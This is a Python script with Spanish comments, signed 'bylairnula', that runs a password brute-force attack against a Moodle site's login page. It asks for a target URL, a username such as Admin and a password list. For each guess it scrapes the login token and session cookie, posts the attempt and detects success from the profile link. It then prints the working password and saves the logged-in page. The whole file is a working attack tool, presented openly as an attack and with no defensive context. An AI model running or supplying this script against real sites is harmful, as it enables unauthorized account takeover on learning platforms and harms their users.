#bylairnula
import requests
from bs4 import BeautifulSoup
from termcolor import colored
import sys
from urllib.parse import urlparse, urlunparse
# Variables globales para almacenar la URL, nombre de usuario y ruta del archivo de contraseñas
url = ""
username = ""
password_file_path = ""

def obtener_protocolo_y_dominio(url):
    parsed_url = urlparse(url)
    # Construimos una nueva URL con el esquema y el dominio
    return urlunparse((parsed_url.scheme, parsed_url.netloc, '', '', '', ''))

def datos_sistema_atacar():
    # Definición de variables globales
    global url, username, password_file_path
    # Solicitar al usuario que ingrese la URL del sitio, nombre de usuario y ruta del archivo de contraseñas
    url = input("(https://your-site-moodle.com/login/index.php) - Site :")
    username = input("( Admin ) - Username :")
    password_file_path = input("(C\\tools\\passwords.txt) - PasswordFile : ")

def obtener_cookie_y_token():
    # Obtener el token de sesión y la cookie MoodleSession
    global url
    
    # Realizar la solicitud GET para obtener la página de inicio de sesión
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Encontrar el formulario con id "login"
    form = soup.find('form', id='login')

    if form:
        # Obtener el método del formulario
        form_method = form.get('method', 'post').lower()

        # Obtener el input con nombre "logintoken"
        logintoken = form.find('input', {'name': 'logintoken'})
        logintoken_value = logintoken.get('value', '') if logintoken else ''

        # Obtener la cookie MoodleSession del encabezado de respuesta
        moodle_session_cookie = response.cookies.get('MoodleSession')

        return logintoken_value, moodle_session_cookie

def inicio_sesion(password, moodle_session_cookie, logintoken_value):
    # Función para iniciar sesión
    global username, url

    data = {'username': username, 'password': password, 'logintoken': logintoken_value}
    headers = {'Cookie': f'MoodleSession={moodle_session_cookie}'}
        
    # Realizar la solicitud POST
    login_response = requests.post(url, data=data, headers=headers)
    soup_response = BeautifulSoup(login_response.text, 'html.parser')

    resultado = obtener_protocolo_y_dominio(url)
    

    profile_link = soup_response.find('a', href=f'{resultado}/user/profile.php', class_='dropdown-item')

    if profile_link:
        print(colored(f"Inicio de sesión exitoso con usuario: {username} y contraseña: {password}", 'green'))

        # Guardar la respuesta en un archivo
        with open('exitoso.html', 'w', encoding='utf-8') as file:
            file.write(login_response.text)

        sys.exit()

    else:
        print(f"Inicio de sesión fallido con contraseña: {password}")

def iniciar_ataque():
    # Función para iniciar el ataque
    global url, username, password_file_path

    # Leer las contraseñas del archivo
    with open(password_file_path, 'r') as file:
        passwords = file.read().splitlines()
    
    # Iterar a través de las contraseñas y realizar el ataque
    for password in passwords:
        # Obtener el token de sesión y la cookie MoodleSession
        logintoken_value, moodle_session_cookie = obtener_cookie_y_token()
        
        inicio_sesion(password, moodle_session_cookie, logintoken_value)

# Llamar a la función para obtener los datos del sistema a atacar
datos_sistema_atacar()

# Llamar a la función para iniciar el ataque
iniciar_ataque()
